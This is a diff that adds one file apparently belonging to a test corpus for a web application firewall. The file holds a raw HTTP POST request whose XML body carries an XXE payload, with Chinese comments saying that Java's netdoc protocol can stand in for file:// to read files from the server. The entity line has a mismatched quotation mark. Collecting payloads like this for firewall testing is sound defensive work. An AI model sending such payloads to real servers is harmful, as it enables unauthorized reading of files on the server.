@@ -1,0 +1,15 @@
+# XML外部实体注入_Java特性netdoc
+# netdoc协议大部分情况下可以代替file使用
+POST /?bid=hd_tag_m8mv24nr HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24nr
+RM-PRO-Token: 1e85484800f305b26403903481e535f1
+RM-PRO-Time: 1742808395982
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE convert [ 
+  <!ENTITY remote SYSTEM "netdoc:///tmp/'> 
+]>
+<convert>&remote;</convert>
